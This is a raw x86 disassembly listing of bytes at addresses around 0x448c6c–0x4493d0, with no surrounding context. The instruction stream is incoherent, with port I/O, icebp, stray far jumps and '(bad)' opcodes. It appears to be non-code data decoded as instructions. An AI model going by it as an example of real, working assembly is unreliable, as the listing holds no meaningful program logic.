  448c6c:	cmp    al,0xed
  448c6e:	or     ecx,DWORD PTR [ebp+0x751bed24]
  448c74:	sub    al,0xed
  448c76:	sub    ebp,DWORD PTR [ebp+0x34]
  448c79:	in     eax,dx
  448c7a:	cmp    eax,DWORD PTR [eax]
  448c7c:	jne    0x448c7a
  448c7e:	jmp    0x448ccb
  448c80:	ins    DWORD PTR es:[edi],dx
  448c81:	add    al,0xec
  448c83:	pop    ebx
  448c84:	push   ebp
  448c85:	in     al,dx
  448c86:	jmp    0x448cf3
  448c88:	dec    ebp
  448c89:	push   esp
  448c8a:	in     eax,dx
  448c8b:	jnp    0x448ce2
  448c8d:	mov    esp,0xa44d8bec
  448c92:	in     al,dx
  448c93:	fwait
  448c94:	xor    eax,0xc9f48bd9
  448c99:	or     DWORD PTR [esp+esi*8-0xbe3f657],edx
  448ca0:	cdq    
  448ca1:	or     DWORD PTR [esp+esi*8],esp
  448ca4:	cmp    DWORD PTR [ecx],ecx
  448ca6:	dec    esp
  448ca7:	hlt    
  448ca8:	dec    ecx
  448ca9:	or     DWORD PTR [esp+esi*8],esi
  448cac:	dec    ecx
  448cad:	or     esp,ebx
  448caf:	sti    
  448cb0:	pop    ecx
  448cb1:	adc    esp,eax
  448cb3:	sti    
  448cb4:	pop    ecx
  448cb5:	adc    esp,ecx
  448cb7:	sti    
  448cb8:	mov    DWORD PTR [ecx],edx
  448cba:	aam    0xfb
  448cbc:	imul   edx,DWORD PTR [ecx],0x1199fb9c
  448cc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448cc3:	sti    
  448cc4:	mov    ecx,0x89fb8c11
  448cc9:	adc    DWORD PTR [ebx+edi*8-0x77],esi
  448ccd:	adc    DWORD PTR [ebx+edi*8-0x27],ebx
  448cd1:	adc    DWORD PTR [ebx+edi*8-0x27],eax
  448cd5:	adc    DWORD PTR [esp+edi*8-0x36bee37],ecx
  448cdc:	test   eax,0xfc9c11
  448ce1:	sbb    DWORD PTR [edx],edx
  448ce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448ce4:	cld    
  448ce5:	mov    ecx,0xc9fccc11
  448cea:	adc    DWORD PTR [esp+edi*8-0x323ee37],esi
  448cf1:	pop    ecx
  448cf2:	adc    al,ah
  448cf4:	cld    
  448cf5:	mov    ebp,0x6283e850
  448cfa:	fnstenv [edi]
  448cfc:	add    al,0x62
  448cfe:	fld    DWORD PTR [ebx-0x73f83e0e]
  448d04:	repnz xchg ecx,eax
  448d06:	pop    es
  448d07:	in     al,0xf2
  448d09:	popa   
  448d0a:	or     ah,cl
  448d0c:	bnd jno 0x448d17
  448d0f:	add    ebp,ecx
  448d11:	nop
  448d12:	cld    
  448d13:	sub    eax,0x2e0c70b5
  448d18:	lods   eax,DWORD PTR ds:[esi]
  448d19:	jo     0x448cb7
  448d1b:	sub    eax,0x2dac70b5
  448d20:	int    0x70
  448d22:	mov    esp,0xcc50d52d
  448d27:	sub    eax,0x2e5c516d
  448d2c:	push   ebp
  448d2d:	push   ecx
  448d2e:	ins    BYTE PTR es:[edi],dx
  448d2f:	lea    edx,cs:[ecx+0x7c]
  448d33:	cs jne 0x448d67
  448d36:	mov    BYTE PTR [esi],ch
  448d38:	xor    DWORD PTR gs:[eax+0x1831252e],edx
  448d3f:	cs and eax,0x352e2031
  448d45:	add    BYTE PTR [ecx],dl
  448d47:	push   eax
  448d48:	imul   cl
  448d4a:	icebp  
  448d4b:	fadd   DWORD PTR [eax]
  448d4d:	pop    ebp
  448d4e:	data16 fld DWORD PTR [eax]
  448d51:	and    DWORD PTR ds:0xfd193a1c,eax
  448d57:	and    edi,DWORD PTR [edx]
  448d59:	shl    esp,0x2b
  448d5c:	cmp    cl,cl
  448d5e:	in     al,dx
  448d5f:	xor    edi,DWORD PTR [edx]
  448d61:	icebp  
  448d62:	in     eax,dx
  448d63:	jmp    0x448d99
  448d65:	or     edx,ebx
  448d67:	repz xor al,0x11
  448d6a:	(bad)  
  448d6c:	xor    al,0xf9
  448d6e:	aad    0x3
  448d70:	xor    eax,0x350bcdf1
  448d75:	sub    DWORD PTR [edx-0x45cecaed],edi
  448d7b:	fwait
  448d7c:	xor    al,0xd
  448d7e:	test   al,0xbf
  448d80:	ss sbb eax,0xa536c7a8
  448d86:	fwait
  448d87:	pop    ss
  448d88:	aaa    
  448d89:	add    bh,cl
  448d8b:	push   ecx
  448d8c:	(bad)  
  448d8d:	not    DWORD PTR ds:[ecx-0x32]
  448d91:	ds out dx,eax
  448d93:	push   ecx
  448d94:	(bad)  
  448d95:	ds out 0x51,eax
  448d98:	fidivr WORD PTR [esi]
  448d9a:	rsqrtps xmm4,xmm6
  448d9d:	xchg   DWORD PTR ds:[edx-0x2],edx
  448da1:	ds jg  0x448df6
  448da4:	push   es
  448da5:	aas    
  448da6:	push   edi
  448da7:	push   esp
  448da8:	push   cs
  448da9:	aas    
  448daa:	add    BYTE PTR [edi],bh
  448dac:	push   esp
  448dad:	dec    edx
  448dae:	aas    
  448daf:	add    edx,DWORD PTR [edx+edx*2+0x3f]
  448db3:	sbb    edx,DWORD PTR [edx+ebx*2+0x3f]
  448db7:	and    edx,DWORD PTR [edx+eiz*2+0x3f]
  448dbb:	fist   DWORD PTR [ebx+0x6a]
  448dbe:	aas    
  448dbf:	add    edx,DWORD PTR [edx+esi*2+0x3f]
  448dc3:	mov    ebx,0x833f7a53
  448dc8:	push   ebx
  448dc9:	cmp    BYTE PTR [edi],0xbb
  448dcc:	push   ebx
  448dcd:	mov    bh,BYTE PTR [edi]
  448dcf:	adc    DWORD PTR [ebx-0x6e],0x3f
  448dd3:	dec    ebx
  448dd4:	push   ebx
  448dd5:	stos   BYTE PTR es:[edi],al
  448dd6:	aas    
  448dd7:	xor    edx,DWORD PTR [ebx-0x4e]
  448dda:	aas    
  448ddb:	retf   
  448ddc:	push   eax
  448ddd:	mov    edx,0xc250b33f
  448de2:	aas    
  448de3:	stos   DWORD PTR es:[edi],eax
  448de4:	push   eax
  448de5:	idiv   bh
  448de7:	retf   
  448de8:	mov    edx,0xda570000
  448ded:	add    BYTE PTR [eax],al
  448def:	ror    DWORD PTR [edx+0x2],cl
  448df2:	xor    BYTE PTR [ebx-0x6ccff5b6],ch
  448df8:	dec    edx
  448df9:	adc    dh,BYTE PTR [eax]
  448dfb:	stos   DWORD PTR es:[edi],eax
  448dfc:	dec    edx
  448dfd:	sbb    dh,BYTE PTR [eax]
  448dff:	xchg   ebx,eax
  448e00:	dec    edx
  448e01:	and    dh,BYTE PTR [eax]
  448e03:	bound  esi,QWORD PTR [eax]
  448e05:	repnz sub edx,DWORD PTR [edx+0x28]
  448e09:	repnz xor edx,DWORD PTR [edx+0xc]
  448e0d:	in     eax,dx
  448e0e:	mov    bh,0x0
  448e10:	push   edx
  448e11:	or     al,0xed
  448e13:	mov    edi,0xc7ed7c52
  448e18:	xor    ch,BYTE PTR [ebp+ebp*8-0x31]
  448e1c:	xor    cl,BYTE PTR [ebp*8-0x12f3cd29]
  448e23:	fbstp  TBYTE PTR [edx]
  448e25:	pushf  
  448e26:	in     al,dx
  448e27:	out    0x92,eax
  448e29:	or     al,0xed
  448e2b:	out    dx,eax
  448e2c:	xchg   edx,eax
  448e2d:	or     al,0xed
  448e2f:	not    DWORD PTR [edx-0x6fec13c8]
  448e35:	loopne 0x448e25
  448e37:	sbb    esi,DWORD PTR [eax-0x28]
  448e3a:	out    dx,al
  448e3b:	and    esi,DWORD PTR [eax-0x70]
  448e3e:	in     al,dx
  448e3f:	dec    ebx
  448e40:	jo     0x448e5a
  448e42:	in     al,dx
  448e43:	push   ebx
  448e44:	jo     0x448ea6
  448e46:	in     al,dx
  448e47:	pop    ebx
  448e48:	push   eax
  448e49:	pop    eax
  448e4a:	in     al,dx
  448e4b:	arpl   WORD PTR [eax-0x30],dx
  448e4e:	jmp    0x448ebb
  448e50:	push   eax
  448e51:	pop    eax
  448e52:	in     al,dx
  448e53:	jae    0x448ea5
  448e55:	lods   al,BYTE PTR ds:[esi]
  448e56:	out    dx,al
  448e57:	xchg   edi,eax
  448e58:	xor    BYTE PTR [esi+ebp*8-0x13a3cf61],bl
  448e5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448e60:	xor    BYTE PTR [esp+ebp*8-0x51],bl
  448e64:	xor    BYTE PTR [esp+ebp*8-0x49],ch
  448e68:	nop
  448e69:	pop    esp
  448e6a:	in     al,dx
  448e6b:	mov    edi,0xc7ec7c90
  448e70:	nop
  448e71:	jl     0x448e5f
  448e73:	iret   
  448e74:	add    BYTE PTR [eax+0x71cfec6c],dl
  448e7a:	fs in  eax,dx
  448e7c:	xlat   BYTE PTR ds:[ebx]
  448e7d:	jno    0x448e58
  448e7f:	mov    ebx,0xa0098df4
  448e84:	hlt    
  448e85:	mov    cl,0x9
  448e87:	call   0xe04e287b
  448e8c:	out    dx,eax
  448e8d:	popa   
  448e8e:	add    eax,0x559efd8
  448e93:	loopne 0x448e84
  448e95:	jno    0x448e9c
  448e97:	enter  0x59ef,0x5
  448e9b:	mov    eax,0x200549ef
  448ea0:	lock xor DWORD PTR ds:0x529efa8,eax
  448ea7:	aam    0xef
  448ea9:	aad    0x5
  448eab:	(bad)  
  448eac:	out    dx,eax
  448ead:	aad    0x5
  448eaf:	fs out dx,eax
  448eb1:	in     eax,0x5
  448eb3:	fs out dx,eax
  448eb5:	aad    0x5
  448eb7:	push   esp
  448eb8:	out    dx,eax
  448eb9:	aad    0x5
  448ebb:	dec    eax
  448ebc:	out    dx,eax
  448ebd:	sbb    DWORD PTR [esi],eax
  448ebf:	adc    bh,ch
  448ec1:	inc    ecx
  448ec2:	push   es
  448ec3:	sbb    bh,ch
  448ec5:	cmp    DWORD PTR [esi],eax
  448ec7:	adc    bh,ch
  448ec9:	lea    eax,[esi]
  448ecb:	js     0x448ebb
  448ecd:	jmp    0xf232eed8
  448ed2:	push   es
  448ed3:	dec    eax
  448ed4:	out    dx,al
  448ed5:	cmc    
  448ed6:	add    esi,esp
  448ed8:	lock add BYTE PTR [ebp-0x7a0f8bfc],al
  448edf:	add    al,0x54
  448ee1:	out    dx,eax
  448ee2:	jne    0x448ee8
  448ee4:	dec    esp
  448ee5:	cld    
  448ee6:	enter  0xb311,0xfc
  448eea:	jmp    0xa8422601
  448eef:	adc    bh,ch
  448ef1:	stc    
  448ef2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448ef3:	(bad)  
  448ef5:	cli    
  448ef6:	jae    0x448f08
  448ef8:	add    edx,edx
  448efa:	mov    eax,0xb8f739f4
  448eff:	or     al,0x3a
  448f01:	inc    edx
  448f02:	test   eax,0xa91539b0
  448f07:	push   ebx
  448f08:	cmp    dh,BYTE PTR [eax-0x67]
  448f0b:	jbe    0x448f47
  448f0d:	push   eax
  448f0e:	cdq    
  448f0f:	mov    WORD PTR [edx],?
  448f11:	lods   al,BYTE PTR ds:[esi]
  448f12:	mov    DWORD PTR [ecx],ebp
  448f14:	cmp    dl,BYTE PTR [esi-0x75c5d777]
  448f1a:	jns    0x448f61
  448f1c:	cmp    ah,bh
  448f1e:	ins    DWORD PTR es:[edi],dx
  448f1f:	shl    DWORD PTR [ecx+eax*1],cl
  448f22:	push   0xfffffff9
  448f24:	xor    al,0x11
  448f26:	push   0xfffffffe
  448f28:	xor    al,0x15
  448f2a:	pop    edx
  448f2b:	or     eax,0x9e4d9d35
  448f30:	xor    al,0xa4
  448f32:	push   ebp
  448f33:	pop    esi
  448f34:	xor    eax,0x35884a85
  448f39:	test   eax,0x5a33a23a
  448f3e:	add    BYTE PTR [ebx],bh
  448f40:	mov    WORD PTR [ebx+esi*1],?
  448f43:	sub    esp,DWORD PTR [ebx]
  448f45:	xor    al,0x11
  448f47:	sub    esi,DWORD PTR [ebx]
  448f49:	xor    al,0x1c
  448f4b:	sbb    ecx,DWORD PTR [ebx+0x34]
  448f4e:	fisttp WORD PTR [edi]
  448f50:	jmp    0xcd36:0xee17e036
  448f57:	(bad)  
  448f59:	aaa    
  448f5a:	mov    cl,0xf7
  448f5c:	cwde   
  448f5d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  448f5f:	out    dx,eax
  448f60:	sahf   
  448f61:	ss cmp ah,dh
  448f64:	call   0x4036:0xb6ec3c36
  448f6b:	aam    0xb2
  448f6d:	ss push esp
  448f6f:	int3   
  448f70:	into   
  448f71:	add    BYTE PTR ss:[edx],bh
  448f74:	inc    esi
  448f75:	xchg   ebx,eax
  448f76:	ds inc edx
  448f78:	inc    esi
  448f79:	ret    
  448f7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448f7c:	inc    ebp
  448f7d:	out    0x3e,eax
  448f7f:	call   0x2f42:0x893f0442
  448f86:	aas    
  448f87:	jb     0x448fcd
  448f89:	push   ebx
  448f8a:	aas    
  448f8b:	fs inc esp
  448f8d:	js     0x448fce
  448f8f:	fs inc esp
  448f91:	mov    BYTE PTR [edi],bh
  448f93:	adc    al,0x43
  448f95:	cwde   
  448f96:	aas    
  448f97:	and    al,0x43
  448f99:	test   al,0x3f
  448f9b:	and    al,0x43
  448f9d:	mov    ebp,0xe942d83f
  448fa2:	aas    
  448fa3:	add    BYTE PTR [ebx-0x39],bh
  448fa6:	add    BYTE PTR [eax],al
  448fa8:	or     ebx,eax
  448faa:	add    BYTE PTR [eax],al
  448fac:	dec    edi
  448fad:	inc    edi
  448fae:	add    dh,BYTE PTR [eax]
  448fb0:	pop    edx
  448fb1:	inc    edi
  448fb2:	sbb    DWORD PTR [eax],esi
  448fb4:	inc    ebp
  448fb5:	inc    edi
  448fb6:	adc    al,0x30
  448fb8:	jo     0x448fff
  448fba:	xor    esi,DWORD PTR [eax]
  448fbc:	xor    eax,DWORD PTR [edi+0x36]
  448fbf:	xor    dh,bh
  448fc1:	inc    esi
  448fc2:	cmp    eax,0x8446e930
  448fc7:	xor    cl,ah
  448fc9:	inc    esi
  448fca:	mov    WORD PTR [eax],?
  448fcc:	test   eax,0xa1309446
  448fd1:	inc    esi
  448fd2:	pushf  
  448fd3:	xor    BYTE PTR [ecx+0x46],cl
  448fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448fd7:	xor    BYTE PTR [ecx+0x4930ac46],ah
  448fdd:	inc    esi
  448fde:	mov    ah,0x30
  448fe0:	inc    ecx
  448fe1:	inc    esi
  448fe2:	lds    esi,FWORD PTR [eax]
  448fe4:	daa    
  448fe5:	inc    esi
  448fe6:	loop   0x449018
  448fe8:	add    eax,0x6230fa46
  448fed:	dec    esi
  448fee:	repz pop ss
  448ff0:	xchg   ebx,eax
  448ff1:	mov    dl,0xf1
  448ff3:	mov    ss,WORD PTR [ebx-0x6c590da1]
  448ff9:	(bad)
  448ffc:	jae    0x44906f
  448ffe:	repnz fidiv DWORD PTR [ebx+0x21]
  449002:	repnz out 0x73,eax
  449005:	aas    
  449006:	lock mov edi,0xf3727000
  44900c:	lock push eax
  44900e:	imul   esi,ebx,0x4a
  449011:	push   ecx
  449012:	shr    edi,1
  449014:	scas   eax,DWORD PTR es:[edi]
  449015:	push   ecx
  449016:	dec    eax
  449017:	out    0x21,al
  449019:	dec    esi
  44901a:	xchg   ebp,eax
  44901b:	lock and BYTE PTR [eax+edx*4],dh
  44901f:	in     al,0x68
  449021:	sub    al,0xb3
  449023:	out    0x85,al
  449025:	xor    al,0x9e
  449027:	out    0x2,al
  449029:	sub    eax,0x9550e543
  44902e:	xchg   ebp,esp
  449030:	ins    DWORD PTR es:[edi],dx
  449031:	lea    edi,[esi-0x4c6a681d]
  449037:	jecxz  0x449002
  449039:	(bad)  
  44903a:	fcomip st,st(4)
  44903c:	sub    BYTE PTR [edx-0x80],bh
  44903f:	cli    
  449040:	cmp    eax,0x58fa647a
  449045:	push   0x5d
  449047:	cli    
  449048:	imul   ebp,DWORD PTR [edx-0x41],0xfffffff4
  44904c:	ret    0xdf5a
  44904f:	hlt    
  449050:	xor    ebx,DWORD PTR [ebx+0x66]
  449053:	sti    
  449054:	jnp    0x4490a1
  449056:	mov    al,0xf9
  449058:	lahf   
  449059:	dec    ebx
  44905a:	xchg   ebp,eax
  44905b:	stc    
  44905c:	test   eax,0xabf9933b
  449061:	cmp    ecx,DWORD PTR [ecx]
  449063:	cli    
  449064:	mov    ch,0x2b
  449066:	fldcw  WORD PTR [edx-0x47efe206]
  44906c:	cli    
  44906d:	add    BYTE PTR [edx+0xaf9840f],al
  449073:	pcmpeqd mm7,mm1
  449076:	dec    BYTE PTR [esi]
  449078:	push   ss
  449079:	stc    
  44907a:	dec    ecx
  44907b:	push   cs
  44907c:	pop    eax
  44907d:	clc    
  44907e:	hlt    
  44907f:	or     eax,0xd9bf8a4
  449084:	jmp    0x6bf7:0x9f0d85f7
  44908b:	or     al,0x27
  44908d:	test   BYTE PTR [edx+0xcf5990a],0xa
  449094:	dec    ecx
  449095:	hlt    
  449096:	lea    ecx,[ecx-0x18]
  449099:	inc    ebx
  44909a:	(bad)  
  44909b:	fst    DWORD PTR [ebx+0x3]
  44909e:	(bad)  
  44909f:	fld    st(7)
  4490a1:	repz sbb BYTE PTR [ecx],cl
  4490a4:	div    bl
  4490a6:	icebp  
  4490a7:	or     BYTE PTR [edx-0xd],ch
  4490aa:	retf   0x9b08
  4490ad:	repz pop edx
  4490af:	or     dh,bh
  4490b1:	repnz xchg esp,eax
  4490b3:	or     al,bl
  4490b5:	repnz (bad) 
  4490b7:	or     ch,BYTE PTR [ebp-0xe]
  4490ba:	(bad)  
  4490bb:	or     dl,BYTE PTR [edx+esi*8+0x3]
  4490bf:	or     esi,DWORD PTR [esi-0xe]
  4490c2:	cmc    
  4490c3:	or     bl,BYTE PTR [edi]
  4490c5:	repnz pop eax
  4490c7:	or     ebx,esi
  4490c9:	icebp  
  4490ca:	mov    edi,0x13f1760b
  4490cf:	or     al,0x96
  4490d1:	lock add BYTE PTR [esp+ecx*1+0xcf8f053],dl
  4490d9:	popf   
  4490da:	out    dx,eax
  4490db:	fisttp QWORD PTR ds:0xe8cef07
  4490e1:	add    DWORD PTR [edi],edi
  4490e3:	add    al,0x48
  4490e5:	sub    al,0xd7
  4490e7:	dec    DWORD PTR [edi]
  4490e9:	das    
  4490ea:	inc    eax
  4490eb:	call   0xd8c7bfad
  4490f0:	sub    DWORD PTR [edi],ebp
  4490f2:	(bad)  
  4490f4:	outs   dx,DWORD PTR ds:[esi]
  4490f5:	cs or  ecx,0xc97d2e7f
  4490fc:	mov    BYTE PTR [esi],ch
  4490fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4490ff:	mov    ecx,0xb9982e13
  449104:	push   ss
  449105:	mov    WORD PTR cs:[ecx-0x4620d1ca],gs
  44910c:	fwait
  44910d:	cmp    BYTE PTR [ebx],dh
  44910f:	mov    ds,WORD PTR [edi-0x4579cfc8]
  449115:	cmp    BYTE PTR [eax],al
  449117:	jle    0x4490d6
  449119:	cmp    bl,bh
  44911b:	jns    0x4490de
  44911d:	cmp    BYTE PTR [esi+ecx*4-0x79],dl
  449121:	cmp    DWORD PTR [eax+0x1637d986],ecx
  449127:	jl     0x4490de
  449129:	cmp    ebp,esp
  44912b:	je     0x449199
  44912d:	cmp    ah,BYTE PTR [ebp+0x53]
  449130:	aas    
  449131:	xor    al,0x5d
  449133:	push   eax
  449134:	xchg   esi,eax
  449135:	xor    eax,0xd9b100e9
  44913a:	add    ch,ah
  44913c:	popa   
  44913d:	fld    DWORD PTR [eax]
  44913f:	xchg   esi,eax
  449140:	xor    ebp,edi
  449142:	xor    al,BYTE PTR [eax]
  449144:	cmp    BYTE PTR [esi],cl
  449146:	xor    al,0xa4
  449148:	xor    ch,BYTE PTR [esi+0x78338c36]
  44914e:	bound  edx,QWORD PTR ss:[ecx]
  449151:	dec    eax
  449152:	imul   cl
  449154:	inc    ecx
  449155:	fld    DWORD PTR [eax]
  449157:	icebp  
  449158:	popa   
  449159:	fld    DWORD PTR [eax]
  44915b:	add    BYTE PTR [edi+ecx*2+0x8],bl
  44915f:	xor    edx,DWORD PTR [edi]
  449161:	inc    edx
  449162:	sbb    esi,DWORD PTR [esi]
  449164:	fadd   DWORD PTR [ecx-0x1c]
  449167:	cmp    esi,ebx
  449169:	dec    ecx
  44916a:	mov    esp,0x10bfb3e
  44916f:	add    BYTE PTR [ebx-0x22],dh
  449172:	add    BYTE PTR [eax],al
  449174:	or     eax,0x5f367950
  449179:	inc    esp
  44917a:	xchg   ecx,eax
  44917b:	aaa    
  44917c:	jmp    0xbd35:0x76382142
  449183:	cmp    BYTE PTR [ebp-0x29c686cc],cl
  449189:	xor    al,0x32
  44918b:	cmp    cl,ah
  44918d:	xor    eax,0x385d3b10
  449192:	sar    DWORD PTR [ebx],0x8a
  449195:	aaa    
  449196:	sbb    eax,0x5d494a3c
  44919b:	cmp    al,0x0
  44919d:	mov    dh,BYTE PTR [edi]
  44919f:	gs cmp al,0x62
  4491a2:	dec    ecx
  4491a3:	ins    DWORD PTR es:[edi],dx
  4491a4:	cmp    al,0xa
  4491a6:	cmp    BYTE PTR [ebp+0x3c],dh
  4491a9:	add    bh,BYTE PTR [eax]
  4491ab:	jge    0x4491e9
  4491ad:	jmp    0x8d36:0xe23c8537
  4491b4:	cmp    al,0xea
  4491b6:	ss xchg ebp,eax
  4491b8:	cmp    al,0xe2
  4491ba:	ss popf 
  4491bc:	cmp    al,0xca
  4491be:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4491c0:	cmp    al,0xe2
  4491c2:	lods   eax,DWORD PTR ss:[esi]
  4491c4:	cmp    al,0x8a
  4491c6:	ss mov ch,0x3c
  4491c9:	xor    BYTE PTR [esi],0xbd
  4491cc:	cmp    al,0x6a
  4491ce:	lds    edi,FWORD PTR ss:[edx+eiz*4]
  4491d2:	ss int 0x3c
  4491d5:	(bad)
  4491da:	fxam   
  4491dc:	in     al,0x46
  4491de:	inc    ecx
  4491df:	out    0xec,eax
  4491e1:	ds fxam 
  4491e4:	hlt    
  4491e5:	ss xor ecx,esi
  4491e8:	cld    
  4491e9:	cs cmp ecx,esi
  4491ec:	add    al,0x27
  4491ee:	inc    ecx
  4491ef:	out    0xc,eax
  4491f1:	lahf   
  4491f2:	fxam   
  4491f4:	adc    al,0x97
  4491f6:	shl    ebp,1
  4491f8:	sbb    al,0x8f
  4491fa:	fxam   
  4491fc:	and    al,0x87
  4491fe:	inc    ecx
  4491ff:	out    0x2c,eax
  449201:	add    BYTE PTR [edi-0x27],bh
  449204:	in     eax,0x34
  449206:	ja     0x4491f9
  449208:	in     eax,0x3c
  44920a:	outs   dx,DWORD PTR ds:[esi]
  44920b:	stc    
  44920c:	in     eax,0x44
  44920e:	addr16 add esi,esp
  449211:	dec    esp
  449212:	pop    edi
  449213:	cdq    
  449214:	in     eax,0x54
  449216:	push   edi
  449217:	shl    ebp,1
  449219:	pop    esp
  44921a:	dec    edi
  44921b:	fxam   
  44921d:	fs inc edi
  44921f:	inc    ecx
  449220:	out    0x6c,eax
  449222:	aas    
  449223:	fxam   
  449225:	je     0x44925e
  449227:	mov    cl,0xe5
  449229:	jl     0x44925a
  44922b:	mov    ecx,0xc12784e5
  449230:	in     eax,0x8c
  449232:	lahf   
  449233:	inc    ecx
  449234:	lock or al,0x94
  449237:	dec    ecx
  449238:	lock adc al,0x8c
  44923b:	shl    edx,1
  44923d:	sbb    al,0x84
  44923f:	jmp    0x41c0b736
  449244:	lock sub al,0x74
  449247:	dec    ecx
  449248:	lock xor al,0x6c
  44924b:	jno    0x44923d
  44924d:	cmp    al,0x64
  44924f:	fnstenv [eax-0x46f8590f]
  449255:	icebp  
  449256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449257:	pop    es
  449258:	mov    cl,0xf1
  44925a:	mov    dh,0x7
  44925c:	mov    ecx,esi
  44925e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44925f:	pop    es
  449260:	xchg   ecx,eax
  449261:	icebp  
  449262:	xchg   BYTE PTR [edi],al
  449264:	jns    0x449257
  449266:	add    BYTE PTR [esi+0x76f17107],al
  44926c:	pop    es
  44926d:	imul   esi,edx,0xf1710766
  449273:	out    0x6,al
  449275:	jns    0x449268
  449277:	out    0x6,al
  449279:	jno    0x44926c
  44927b:	test   BYTE PTR [esi],0x89
  44927e:	icebp  
  44927f:	out    0x6,al
  449281:	xchg   ecx,eax
  449282:	icebp  
  449283:	push   es
  449284:	pop    es
  449285:	jns    0x449278
  449287:	push   es
  449288:	pop    es
  449289:	jno    0x44927c
  44928b:	test   BYTE PTR [esi],0xa9
  44928e:	icebp  
  44928f:	out    0x6,al
  449291:	mov    cl,0xf1
  449293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449294:	push   es
  449295:	pop    esi
  449296:	lock xchg ebp,eax
  449298:	inc    ebp
  449299:	call   0x201df5a1
  44929e:	add    al,0x62
  4492a0:	fnstenv [ebp-0x45f1990b]
  4492a6:	clc    
  4492a7:	daa    
  4492a8:	push   cs
  4492a9:	jns    0x4492a3
  4492ab:	jno    0x4492ba
  4492ad:	fucomip st,st(3)
  4492af:	push   esp
  4492b0:	add    ebp,edi
  4492b2:	jmp    0x449244
  4492b4:	add    DWORD PTR [eax-0x4efe0315],esi
  4492ba:	jmp    0x2e4:0xea6502d1
  4492c1:	mov    dl,0xed
  4492c3:	sar    bh,cl
  4492c5:	xchg   edx,eax
  4492c6:	in     eax,dx
  4492c7:	inc    eax
  4492c8:	add    BYTE PTR [ecx],al
  4492ca:	pop    esi
  4492cb:	add    BYTE PTR [esi],bh
  4492cd:	push   es
  4492ce:	xor    eax,0x339b3531
  4492d3:	mov    esi,0xb734690c
  4492d8:	adc    edi,DWORD PTR [edi+0x26137336]
  4492de:	aaa    
  4492df:	sbb    BYTE PTR [ebx],dl
  4492e1:	or     esi,DWORD PTR [esi]
  4492e3:	jmp    0x2d456d39
  4492e8:	popa   
  4492e9:	fld    DWORD PTR [eax]
  4492eb:	pop    edi
  4492ec:	icebp  
  4492ed:	jb     0x449320
  4492ef:	daa    
  4492f0:	icebp  
  4492f1:	pop    ds
  4492f2:	xor    DWORD PTR [edi-0x29],ebx
  4492f5:	xchg   ecx,eax
  4492f6:	xor    cl,dh
  4492f8:	rcr    ah,1
  4492fa:	xor    DWORD PTR [esi-0x35],esi
  4492fd:	jnp    0x44932b
  4492ff:	xchg   esp,eax
  449300:	retf   
  449301:	sub    ebp,DWORD PTR [ecx+ebp*8]
  449304:	mov    bh,0xd1
  449306:	cs sti 
  449308:	scas   eax,DWORD PTR es:[edi]
  449309:	lods   al,BYTE PTR ds:[esi]
  44930a:	cs push ss
  44930c:	mov    ah,0x57
  44930e:	das    
  44930f:	jle    0x4492bd
  449311:	test   DWORD PTR [edi],ebp
  449313:	mov    DWORD PTR [esp+esi*1-0xf7307d1],edx
  44931a:	sub    eax,0x2e47957a
  44931f:	nop
  449320:	(bad)  
  449321:	fstp   TBYTE PTR [eax]
  449323:	in     eax,0x89
  449325:	or     bh,BYTE PTR [ecx]
  449327:	xor    BYTE PTR [esi+0x7e5938c6],al
  44932d:	cmp    WORD PTR [ecx+0x39267600],bp
  449334:	pop    esi
  449335:	dec    esi
  449336:	fdiv   QWORD PTR [edi]
  449338:	adc    BYTE PTR [edi+0x4],al
  44933b:	cmp    ch,bh
  44933d:	cmp    ebx,edi
  44933f:	cmp    dl,BYTE PTR ds:0x3aa338
  449345:	and    DWORD PTR [edx],esi
  449347:	xchg   DWORD PTR [edx],edi
  449349:	lahf   
  44934a:	das    
  44934b:	loop   0x449387
  44934d:	retf   
  44934e:	cs inc edi
  449350:	cmp    edx,DWORD PTR [eax+0x3f3be430]
  449356:	xor    al,0x38
  449358:	cmp    al,0x22
  44935a:	xor    al,0x82
  44935c:	cmp    al,0x8f
  44935e:	dec    ecx
  44935f:	xchg   edx,eax
  449360:	cmp    al,0x9f
  449362:	dec    ecx
  449363:	mov    ds:0xb2493f3c,al
  449368:	cmp    al,0xf3
  44936a:	dec    eax
  44936b:	or     al,0x3d
  44936d:	mov    bh,0x48
  44936f:	cmp    al,0x3d
  449371:	(bad)  [eax+0x64]
  449374:	cmp    eax,0x3d9a495b
  449379:	in     eax,dx
  44937a:	dec    eax
  44937b:	fstp   TBYTE PTR ds:0x3e0748ae
  449381:	les    esi,FWORD PTR ds:0x337a3e34
  449387:	cmp    BYTE PTR [esi],0x33
  44938a:	ss jl  0x4493cb
  44938d:	(bad)  
  44938f:	stos   DWORD PTR es:[edi],eax
  449390:	shl    BYTE PTR ds:0xff003ee8,cl
  449397:	xor    eax,0x328e3f02
  44939c:	sub    edi,DWORD PTR [edi]
  44939e:	inc    esi
  44939f:	xor    al,0x5b
  4493a1:	aas    
  4493a2:	push   0x34
  4493a4:	xchg   ebx,eax
  4493a5:	aas    
  4493a6:	sub    dh,BYTE PTR [ebx]
  4493a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4493a9:	aas    
  4493aa:	ret    0xd732
  4493ad:	aas    
  4493ae:	div    BYTE PTR [edx]
  4493b0:	idiv   bh
  4493b2:	jnp    0x4493eb
  4493b4:	add    DWORD PTR [eax],eax
  4493b6:	sub    ebx,esi
  4493b8:	add    BYTE PTR [eax],al
  4493ba:	push   esp
  4493bb:	inc    edi
  4493bc:	sbb    eax,0xf26f6230
  4493c1:	addr16 xchg edx,eax
  4493c3:	sub    dh,dl
  4493c5:	xor    DWORD PTR [edx-0x3f],0xfffffff1
  4493c9:	mov    dh,0x72
  4493cb:	in     eax,dx
  4493cc:	icebp  
  4493cd:	out    dx,al
  4493ce:	jb     0x449405
  4493d0:	in     eax,dx
